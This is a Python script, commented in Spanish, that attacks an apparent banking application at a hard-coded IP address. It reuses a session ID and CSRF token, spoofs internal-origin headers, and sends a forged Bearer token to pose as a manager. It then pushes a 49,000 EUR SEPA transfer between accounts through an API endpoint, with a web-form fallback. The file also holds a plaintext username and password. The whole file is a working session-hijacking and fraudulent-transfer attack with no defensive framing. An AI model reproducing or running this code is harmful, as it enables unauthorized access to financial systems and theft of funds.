import requests
import json
from datetime import datetime

# === IP interna simulada del gerente ===
INTERNAL_IP = "192.168.1.10"
INTERNAL_LOCATION = "OFICINA-CENTRAL-ES"
HOST = "80.78.30.242"

# === Cookies que sí tienes ===
CSRF_TOKEN = "c7JgjaDBxCeUusaQ5tIu16FUOUCcvb6S"
SESSION_ID = "e7vjs7gukq4qr8f9oexkkha04nrqm761"

# === Credenciales de tu usuario ===
USERNAME = "markmur88"
PASSWORD = "Ptf8454Jd55"

# === Token dummy que imita al sistema (aunque invalid) ===
DUMMY_JWT = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.xxxxx"

# === Headers de un gerente dentro del sistema bancario ===
headers = {
    "Host": HOST,
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Accept": "application/xml,application/xhtml+xml,application/json",
    "Accept-Language": "es-ES;q=0.9,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": f"http://{HOST}",
    "X-Requested-With": "XMLHttpRequest",
    "X-Origin-IP": INTERNAL_IP,
    "X-Location": INTERNAL_LOCATION,
    "X-Session-Type": "BANCO-API-INTERNAL",
    "X-Token-ID": DUMMY_JWT,
    "Authorization": f"Bearer {DUMMY_JWT}",
    "Content-Type": "application/json"
}

# === Cookie directa del gerente para falsificar sesión ===
cookies = {
    "csrftoken": CSRF_TOKEN,
    "sessionid": SESSION_ID
}

# === Datos que usan el modelo Django ORM interno, pero en JSON ====
transfer_data = {
    "payment_id": "234e5467-664b-4994-a676-997755440000",
    "debtor_account_id": 201,
    "creditor_account_id": 202,
    "instructed_amount": "49000.00",
    "currency": "EUR",
    "requested_execution_date": datetime.today().strftime("%Y-%m-%d"),
    "remittance_information_unstructured": "Pago interno",
    "purpose_code": "GDSV",
    "status": "ACSC"
}

# === Ataque desde sesión falsa, cookies y token dummy ===
def inject_full_xfer():
    s = requests.Session()
    s.headers.update(headers)
    s.cookies.update(cookies)

    print("[+] Inyectando transferencia desde red falsificada interna")
    xfer_response = s.post(f"http://{HOST}:9181/api/send-transfer", json=transfer_data)
    print("Estado de transfer SEPA:", xfer_response.status_code)
    print("Respuesta:", xfer_response.text)

# === Si no funciona, inyectamos directo a la web app interna ===
def inject_web_form():
    s = requests.Session()
    s.headers.update({
        "Host": HOST,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "es;en-US;q=0.5",
        "X-Origin-IP": INTERNAL_IP,
        "X-Location": INTERNAL_LOCATION,
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": f"http://{HOST}/api/transferencia",
        "Cookie": f"csrftoken={CSRF_TOKEN}; sessionid={SESSION_ID}"
    })

    form_data = {
        "csrfmiddlewaretoken": CSRF_TOKEN,
        "debtor_account": 201,
        "creditor_account": 202,
        "instructed_amount": "49000.00",
        "currency": "EUR",
        "purpose_code": "GDSV",
        "status": "ACSC",
        "remittance_information_unstructured": "Transf interna entre cuentas del sistema"
    }

    print("[+] Enviando formulario web interno como gerente")
    web_response = s.post(f"http://{HOST}:9181/api/transferencia", data=form_data)
    print("Estado inyección vía formulario web:", web_response.status_code)
    print(web_response.text)

# === Tu última conexión ===
def main():
    inject_full_xfer()
    inject_web_form()

if __name__ == "__main__":
    main()